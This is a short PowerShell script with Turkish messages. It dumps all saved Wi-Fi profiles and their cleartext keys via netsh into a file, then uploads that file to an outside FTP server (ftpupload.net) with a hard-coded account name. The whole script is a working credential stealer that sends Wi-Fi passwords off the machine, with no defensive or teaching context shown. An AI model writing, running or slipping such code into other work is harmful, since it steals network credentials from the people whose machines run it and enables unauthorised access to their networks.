$ftpUser = "if0_39536575"
$ftpPass = $env:FTP_PASS

if (-not $ftpPass) {
    Write-Error "FTP_PASS ortam degiskeni ayarli degil!"
    exit 1
}

$localFile = "$env:USERPROFILE\wifipass.txt"
netsh wlan show profile name="*" key=clear > $localFile

$ftpUrl = "ftp://ftpupload.net/wifipass.txt"

$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

try {
    $webclient.UploadFile($ftpUrl, "STOR", $localFile)
    Write-Host "Dosya basariyla FTP'ye yuklendi."
}
catch {
    Write-Host "Hata olustu: $_"
}
